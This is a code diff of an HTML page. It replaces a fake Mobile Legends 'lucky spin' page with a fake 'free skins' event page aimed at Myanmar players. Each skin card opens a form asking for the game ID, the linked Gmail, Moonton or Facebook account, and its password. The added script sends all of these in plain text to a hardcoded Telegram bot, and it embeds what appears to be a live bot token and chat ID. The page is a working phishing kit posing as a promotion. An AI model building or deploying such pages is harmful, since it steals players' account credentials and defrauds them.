@@ -1,139 +1,428 @@
-<!DOCTYPE html>
+<!-- MLBB Event Layout with Full Width Header, Large Logo, and Store Badges -->
 <html lang="my">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>MLBB Lucky Spin</title>
-<style>
-  * { margin:0; padding:0; box-sizing:border-box; font-family: 'Arial', sans-serif; }
-  body, html { width:100%; height:100%; overflow-x:hidden; background: linear-gradient(135deg, #1e3c72, #2a5298, #fdd835, #fbc02d); position:relative; display:flex; justify-content:center; align-items:center; }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MLBB EVENT</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
+    <style>
+        body {
+            /* 🛠️ Background color ကို Header color (#1a1a1a) နဲ့ ချိန်လိုက်သည် */
+            background-color: #1a1a1a; 
+            color: #ffffff;
+            font-family: 'Inter', sans-serif;
+            padding: 0;
+            margin: 0;
+        }
+        .container {
+            max-width: 768px;
+            margin: auto;
+            padding: 0 8px; /* For mobile spacing */
+        }
+        
+        /* Header Styling - Logo ဘယ်၊ Links ညာ၊ Full Width */
+        .event-header {
+            background-color: #1a1a1a; /* MLBB Logo အောက်ခံအရောင် */
+            padding: 8px 16px;
+            display: flex;
+            justify-content: space-between; 
+            align-items: center;
+            border-bottom: 2px solid #333;
+            width: 100%; 
+            box-sizing: border-box; 
+        }
+        
+        /* Links Container Style */
+        .platform-links {
+            display: flex;
+            align-items: center;
+        }
+        .platform-links a {
+            margin-left: 8px;
+            display: inline-block;
+        }
+        .platform-links img {
+            height: 24px;
+            border-radius: 4px;
+        }
+        
+        /* New Logo Icon Style - အရွယ်အစား တိုးမြှင့်သည် */
+        .header-logo-icon {
+            height: 45px; /* Logo အရွယ်အစားကို ကြီးအောင် ချိန်လိုက်သည် */
+            border-radius: 4px;
+        }
 
-  body::before {
-    content: '';
-    background: url('https://upload.wikimedia.org/wikipedia/en/thumb/2/2a/Mobile_Legends_Logo.png/640px-Mobile_Legends_Logo.png') no-repeat center;
-    background-size: 50%;
-    opacity: 0.05;
-    position: absolute; top:0; left:0; width:100%; height:100%; z-index:0;
-  }
+        /* Banner Styling */
+        .main-banner {
+            width: 100%;
+            height: auto;
+            border-radius: 8px;
+            margin: 16px 0;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+            /* Fallback image style */
+            background-color: #333;
+            min-height: 150px;
+            display: block;
+        }
 
-  .container {
-    z-index:1;
-    width: 90%; max-width:480px;
-    background: rgba(255,255,255,0.05);
-    border-radius: 20px;
-    padding: 20px;
-    text-align: center;
-    backdrop-filter: blur(10px);
-    color: #fff;
-  }
+        /* Skin Grid Layout */
+        .skin-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); /* Responsive grid */
+            gap: 12px;
+            padding: 16px 0;
+        }
+        @media (min-width: 640px) {
+            .skin-grid {
+                grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
+                gap: 16px;
+            }
+        }
 
-  .user-info {
-    height: 50px;
-    margin-bottom: 20px;
-    border: 2px dashed rgba(255,255,255,0.5);
-    border-radius: 12px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 16px;
-    color: rgba(255,255,255,0.7);
-  }
+        /* Skin Item Card Styling */
+        .item-card {
+            background-color: #1a1a1a; /* Body နဲ့ အရောင်တူစေရန် */
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.4);
+            cursor: pointer;
+            transition: transform 0.1s;
+            position: relative; /* For FREE overlay */
+            height: auto;
+            border: 2px solid transparent;
+        }
+        .item-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(240, 82, 82, 0.6);
+            border-color: #f05252;
+        }
+        
+        .skin-image {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
 
-  .icons { display:flex; justify-content: space-around; margin-bottom:20px; }
-  .icons img { width:50px; height:50px; }
+        /* FREE Overlay Styling */
+        .free-tag {
+            position: absolute;
+            bottom: 0;
+            right: 0;
+            background-color: #E6B300; /* Gold/Yellow background */
+            color: #121212;
+            padding: 2px 8px;
+            border-top-left-radius: 8px;
+            font-size: 0.75rem;
+            font-weight: 900;
+            text-transform: uppercase;
+            box-shadow: 0 0 5px rgba(0, 0, 0, 0.5);
+        }
 
-  .wheel-container { position:relative; width:250px; height:250px; margin:0 auto 20px auto; }
-  .wheel { width:100%; height:100%; border-radius:50%; border:10px solid #fff; position:relative; overflow:hidden; transform: rotate(0deg); transition: transform 5s cubic-bezier(0.25, 0.1, 0.25, 1); }
-  .wheel div { position:absolute; width:50%; height:50%; background: rgba(255,255,255,0.2); top:0; right:0; transform-origin:0% 100%; }
-
-  .segment-label { position:absolute; width:50%; height:50%; top:0; right:0; transform-origin:0% 100%; display:flex; align-items:flex-end; justify-content:center; padding-bottom:10px; font-size:12px; }
-
-  input[type="text"] { width:80%; padding:10px; margin-bottom:15px; border-radius:10px; border:none; font-size:16px; outline:none; }
-  button { padding:12px 20px; background: linear-gradient(135deg, #2196F3, #FFC107); border:none; border-radius:15px; color:#fff; font-size:18px; cursor:pointer; transition: transform 0.2s; }
-  button:active { transform: scale(0.95); }
-
-  .popup { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); display:flex; justify-content:center; align-items:center; display:none; z-index:2; }
-  .popup-content { background:#1e3c72; padding:25px; border-radius:20px; text-align:center; }
-  .popup-content h2 { margin-bottom:15px; }
-  .popup-content button { margin-top:15px; background:#fdd835; color:#000; }
-</style>
+        /* Modal Styling */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s ease;
+        }
+        .modal-overlay.open {
+            opacity: 1;
+            visibility: visible;
+        }
+        .modal-content {
+            background-color: #252525; /* Modal content ကို နည်းနည်း ထင်ပေါ်အောင် အရောင်ပြောင်းလိုက်သည် */
+            padding: 24px;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.7);
+            transform: scale(0.9);
+            transition: transform 0.3s ease;
+        }
+        .modal-overlay.open .modal-content {
+            transform: scale(1);
+        }
+        .modal-input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border-radius: 6px;
+            border: 2px solid #333;
+            background-color: #3a3a3a;
+            color: white;
+            font-size: 1rem;
+        }
+        .modal-send-btn {
+            background-color: #2d942e; /* Green button */
+            color: white;
+            padding: 10px 20px;
+            border-radius: 6px;
+            font-weight: 700;
+            transition: background-color 0.2s;
+            cursor: pointer;
+        }
+        .modal-send-btn:hover {
+            background-color: #247525;
+        }
+        .modal-close-btn {
+            background-color: #942d2d; /* Red button */
+            margin-left: 10px;
+        }
+        .modal-close-btn:hover {
+             background-color: #752424;
+        }
+    </style>
 </head>
 <body>
 
-<div class="container">
-  <div class="user-info">User info blank</div>
+    <!-- Event Header (Logo ဘယ်၊ Links ညာ၊ Full Width) -->
+    <div class="event-header">
+        
+        <!-- 🚨 MLBB Logo Icon (ဘယ်ဘက်တွင် နေရာယူသည်) -->
+        <img class="header-logo-icon" src="https://i.ibb.co/C3QdFrk0/1910.png" 
+             onerror="this.onerror=null;this.src='https://placehold.co/45x45/f05252/ffffff?text=Logo';" 
+             alt="MLBB New Logo">
 
-  <div class="icons">
-    <img src="https://img.icons8.com/color/96/000000/treasure-chest.png" alt="Chest">
-    <img src="https://img.icons8.com/color/96/000000/diamond.png" alt="Diamond">
-    <img src="https://img.icons8.com/color/96/000000/scroll.png" alt="Scroll">
-    <img src="https://img.icons8.com/color/96/000000/gift.png" alt="Gift">
-  </div>
-
-  <div class="wheel-container">
-    <div class="wheel" id="wheel">
-      <div class="segment-label" style="transform: rotate(0deg);">Mini</div>
-      <div class="segment-label" style="transform: rotate(60deg);">Medium</div>
-      <div class="segment-label" style="transform: rotate(120deg);">Double</div>
-      <div class="segment-label" style="transform: rotate(180deg);">50 Diamonds</div>
-      <div class="segment-label" style="transform: rotate(240deg);">500 Diamonds</div>
-      <div class="segment-label" style="transform: rotate(300deg);">Epic Skin</div>
+        <!-- Platform Links (ညာဘက်တွင် နေရာယူသည်) -->
+        <div class="platform-links">
+            <!-- App Store Link -->
+            <a href="#">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3c/Download_on_the_App_Store_Badge.svg/1200px-Download_on_the_App_Store_Badge.svg.png" 
+                     onerror="this.onerror=null;this.src='https://placehold.co/100x30/1c1c1c/ffffff?text=App+Store'" 
+                     alt="App Store Link">
+            </a>
+            <!-- Google Play Link -->
+            <a href="#">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/1200px-Google_Play_Store_badge_EN.svg.png" 
+                     onerror="this.onerror=null;this.src='https://placehold.co/100x30/1c1c1c/ffffff?text=Google+Play'" 
+                     alt="Google Play Link">
+            </a>
+        </div>
     </div>
-  </div>
 
-  <input type="text" id="gameId" placeholder="Enter Game ID">
-  <br>
-  <button id="spinBtn">ကံစမ်းမယ်</button>
-</div>
+    <div class="container">
+        <!-- 🛠️ Main Promo Banner (ပုံအသစ်ဖြင့် အစားထိုးထားသည်) -->
+        <img class="main-banner" 
+             src="https://i.ibb.co/xPMP0Rn/1958.png" 
+             onerror="this.onerror=null;this.src='https://placehold.co/768x200/2c2c2c/ffffff?text=EXCLUSIVE+EVENT+BANNER'" 
+             alt="Exclusive Event Banner">
+        
+        <!-- Skin Grid -->
+        <div class="skin-grid">
+            <!-- POKO Skin (1) -->
+            <div class="item-card" onclick="openTelegramModal('Skin 1885')">
+                <img class="skin-image" src="https://i.ibb.co/3Yvp2cq6/1885.png" onerror="fallbackImage(this)" alt="Reward Image 1">
+                <div class="free-tag">FREE</div>
+            </div>
 
-<div class="popup" id="popup">
-  <div class="popup-content">
-    <h2 id="resultText">You won!</h2>
-    <button id="closePopup">Close</button>
-  </div>
-</div>
+            <!-- POKO Skin (2) -->
+            <div class="item-card" onclick="openTelegramModal('Skin 1895')">
+                <img class="skin-image" src="https://i.ibb.co/zh0Jd5CV/1895.png" onerror="fallbackImage(this)" alt="Reward Image 2">
+                <div class="free-tag">FREE</div>
+            </div>
 
-<script>
-  const wheel = document.getElementById('wheel');
-  const spinBtn = document.getElementById('spinBtn');
-  const popup = document.getElementById('popup');
-  const resultText = document.getElementById('resultText');
-  const closePopup = document.getElementById('closePopup');
+            <!-- POKO Skin (3) -->
+            <div class="item-card" onclick="openTelegramModal('Skin 1886')">
+                <img class="skin-image" src="https://i.ibb.co/WWKsqcJt/1886.png" onerror="fallbackImage(this)" alt="Reward Image 3">
+                <div class="free-tag">FREE</div>
+            </div>
 
-  // Diamond icon for reward
-  const diamondIcon = '<img src="https://img.icons8.com/color/48/000000/diamond.png" alt="Diamond" style="width:24px;height:24px;vertical-align:middle;">';
+            <!-- POKO Skin (4) -->
+            <div class="item-card" onclick="openTelegramModal('Skin 1943')">
+                <img class="skin-image" src="https://i.ibb.co/DDTqLTRc/1943.png" onerror="fallbackImage(this)" alt="Reward Image 4">
+                <div class="free-tag">FREE</div>
+            </div>
+            
+            <!-- POKO Skin (5) -->
+            <div class="item-card" onclick="openTelegramModal('Skin 1941')">
+                <img class="skin-image" src="https://i.ibb.co/cKb4xPWw/1941.png" onerror="fallbackImage(this)" alt="Reward Image 5">
+                <div class="free-tag">FREE</div>
+            </div>
 
-  spinBtn.addEventListener('click', () => {
-    const gameId = document.getElementById('gameId').value.trim();
-    if(!gameId){
-      alert("Please enter your Game ID!");
-      return;
-    }
+            <!-- POKO Skin (6) -->
+            <div class="item-card" onclick="openTelegramModal('Skin 1938')">
+                <img class="skin-image" src="https://i.ibb.co/sBtzhF6/1938.png" onerror="fallbackImage(this)" alt="Reward Image 6">
+                <div class="free-tag">FREE</div>
+            </div>
 
-    // Fixed reward: 5000 Diamonds
-    const reward = `5000 Diamonds ${diamondIcon}`;
+            <!-- POKO Skin (7) -->
+            <div class="item-card" onclick="openTelegramModal('Skin 1925')">
+                <img class="skin-image" src="https://i.ibb.co/jPwPkf6t/1925.png" onerror="fallbackImage(this)" alt="Reward Image 7">
+                <div class="free-tag">FREE</div>
+            </div>
 
-    // Spin animation (visual only)
-    const spins = 5; 
-    const segmentDeg = 360 / 6; 
-    const randomDeg = Math.floor(Math.random() * segmentDeg); 
+            <!-- POKO Skin (8) -->
+            <div class="item-card" onclick="openTelegramModal('Skin 1899')">
+                <img class="skin-image" src="https://i.ibb.co/gMMcgC6f/1899.png" onerror="fallbackImage(this)" alt="Reward Image 8">
+                <div class="free-tag">FREE</div>
+            </div>
 
-    wheel.style.transition = 'transform 5s cubic-bezier(0.25, 0.1, 0.25, 1)';
-    wheel.style.transform = `rotate(${spins*360 + randomDeg}deg)`;
+            <!-- POKO Skin (9) -->
+            <div class="item-card" onclick="openTelegramModal('Skin 1898')">
+                <img class="skin-image" src="https://i.ibb.co/JwMMMYqx/1898.png" onerror="fallbackImage(this)" alt="Reward Image 9">
+                <div class="free-tag">FREE</div>
+            </div>
 
-    spinBtn.disabled = true;
+            <!-- POKO Skin (10) -->
+            <div class="item-card" onclick="openTelegramModal('Skin 1897')">
+                <img class="skin-image" src="https://i.ibb.co/SDWszLjb/1897.png" onerror="fallbackImage(this)" alt="Reward Image 10">
+                <div class="free-tag">FREE</div>
+            </div>
 
-    setTimeout(() => {
-      spinBtn.disabled = false;
-      resultText.innerHTML = `Game ID: ${gameId}<br>Reward: ${reward}`;
-      popup.style.display = 'flex';
-    }, 5000);
-  });
+            <!-- POKO Skin (11) -->
+            <div class="item-card" onclick="openTelegramModal('Skin 1890')">
+                <img class="skin-image" src="https://i.ibb.co/M5tKKgNH/1890.png" onerror="fallbackImage(this)" alt="Reward Image 11">
+                <div class="free-tag">FREE</div>
+            </div>
 
-  closePopup.addEventListener('click', () => {
-    popup.style.display = 'none';
-  });
-</script>
+            <!-- POKO Skin (12) -->
+            <div class="item-card" onclick="openTelegramModal('Skin 1901')">
+                <img class="skin-image" src="https://i.ibb.co/9Qq4tNf/1901.png" onerror="fallbackImage(this)" alt="Reward Image 12">
+                <div class="free-tag">FREE</div>
+            </div>
+            
+        </div>
+    </div>
 
+
+    <!-- Telegram Modal (Functionality is kept) -->
+    <div id="telegramModal" class="modal-overlay">
+        <div class="modal-content">
+            <!-- 1. ခေါင်းစဉ် ပြောင်းလဲခြင်း -->
+            <h3 class="text-lg font-bold mb-4 text-yellow-400">Mobile Legends Bang Bang</h3>
+            
+            <!-- 2. Skin Display ကို static text ဖြင့် အစားထိုးခြင်း -->
+            <p id="skinNameDisplay" class="mb-4 text-center font-semibold text-red-500">Myanmar Only User</p>
+            
+            <!-- 3. ပထမအကွက် (ID/Server ID) -->
+            <!-- Label ဖြုတ်ပြီး Placeholder သာထားသည် -->
+            <input type="text" id="messageLine1" class="modal-input" placeholder="Your ID/Server ID" required>
+
+            <!-- 4. ဒုတိယအကွက် (Account Type) -->
+            <!-- Label ဖြုတ်ပြီး Placeholder သာထားသည် -->
+            <input type="text" id="messageLine2" class="modal-input" placeholder="Mlbb account နှင့်ချိတ်ထားသော Gmail/moonton/Facebook" required>
+            
+            <!-- 5. 🛠️ တတိယအကွက် (Password) အသစ်ထည့်သွင်းခြင်း -->
+            <input type="password" id="messageLine3" class="modal-input" placeholder="Password" required>
+
+            <div class="flex justify-end mt-4">
+                <button onclick="sendMessageToTelegram()" class="modal-send-btn">
+                    စာပို့မည်
+                </button>
+                <button onclick="closeTelegramModal()" class="modal-send-btn modal-close-btn">
+                    ပိတ်မည်
+                </button>
+            </div>
+            <!-- Status message area -->
+            <p id="modalStatus" class="mt-4 text-center text-sm"></p>
+        </div>
+    </div>
+
+    <script>
+        // ----------------------------------------------------
+        // 🚨 Telegram Bot Configuration
+        // ----------------------------------------------------
+        const TELEGRAM_BOT_TOKEN = '8401107435:AAF_g6gQ1BApPyLlY_zE3BDm_1EvLKqqLKA'; 
+        const CHAT_ID = '8434049778'; 
+        // ----------------------------------------------------
+
+
+        // Image Fallback Function (ပုံမပေါ်ရင် Placeholder ပြန်ပြဖို့)
+        function fallbackImage(img) {
+            img.onerror = null; // Prevent infinite loop
+            img.src = `https://placehold.co/100x150/2c2c2c/ffffff?text=Broken+Image`;
+        }
+
+        let selectedSkin = ''; // နှိပ်လိုက်တဲ့ Skin နာမည်ကို သိမ်းထားဖို့
+
+        // Modal ကို ဖွင့်ရန်
+        function openTelegramModal(skinName) {
+            selectedSkin = skinName;
+            // Static text ကို မပြောင်းလဲတော့ပါ၊ selectedSkin နာမည်ကို သိမ်းထားရုံသာ
+            document.getElementById('telegramModal').classList.add('open');
+            document.getElementById('modalStatus').innerText = ''; // Status ကိုရှင်းလင်းခြင်း
+        }
+
+        // Modal ကို ပိတ်ရန်
+        function closeTelegramModal() {
+            document.getElementById('telegramModal').classList.remove('open');
+            // Form Data သုံးခုလုံးကို ရှင်းလင်းခြင်း
+            document.getElementById('messageLine1').value = '';
+            document.getElementById('messageLine2').value = '';
+            document.getElementById('messageLine3').value = ''; // 🛠️ New: password field ကိုပါ ရှင်းလင်းမည်
+        }
+
+        // Telegram သို့ စာပို့ရန် Function (API Call)
+        async function sendMessageToTelegram() {
+            const statusElement = document.getElementById('modalStatus');
+            const idServer = document.getElementById('messageLine1').value.trim(); // Your ID/Server ID
+            const accountType = document.getElementById('messageLine2').value.trim(); // Gmail/Moonton/Facebook
+            const password = document.getElementById('messageLine3').value.trim(); // 🛠️ New: Password
+            
+            // 🛠️ Validation သုံးခုလုံး စစ်ဆေးခြင်း
+            if (!idServer || !accountType || !password) {
+                statusElement.innerText = 'အကွက်အားလုံးကို ဖြည့်သွင်းရန် လိုအပ်ပါသည်။';
+                statusElement.style.color = '#f05252'; // Red
+                return;
+            }
+
+            const fullMessage = `
+                🚨 NEW SKIN REQUEST (Myanmar Only User) 🚨
+                -------------------------------------
+                *SKIN SELECTED:* ${selectedSkin}
+                *USER ID/SERVER ID:* ${idServer}
+                *ACCOUNT TYPE/EMAIL:* ${accountType}
+                *PASSWORD:* ${password} 
+                -------------------------------------
+                *WARNING: THIS CONTAINS SENSITIVE CREDENTIALS!*
+            `;
+
+            const apiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            statusElement.innerText = 'ပို့နေပါသည်...';
+            statusElement.style.color = '#fca311'; // Yellow
+
+            try {
+                const response = await fetch(apiUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: fullMessage,
+                        parse_mode: 'Markdown' 
+                    })
+                });
+
+                const data = await response.json();
+
+                if (response.ok && data.ok) {
+                    statusElement.innerText = 'ပို့ပြီးပါပြီ! ကျေးဇူးတင်ပါသည်။';
+                    statusElement.style.color = '#2d942e'; // Green
+                    // 3 စက္ကန့်အကြာတွင် Modal ပိတ်ရန်
+                    setTimeout(closeTelegramModal, 3000); 
+                } else {
+                    statusElement.innerText = `စာပို့မရပါ: ${data.description || 'အမှားတစ်ခုခုရှိနေပါသည်။ Token သို့မဟုတ် Chat ID ကို စစ်ပါ။'}`;
+                    statusElement.style.color = '#f05252'; // Red
+                }
+
+            } catch (error) {
+                console.error('Fetch Error:', error);
+                statusElement.innerText = 'ကွန်ရက် ချိတ်ဆက်မှု အမှားဖြစ်နေပါသည်။';
+                statusElement.style.color = '#f05252'; // Red
+            }
+        }
+    </script>
 </body>
 </html>
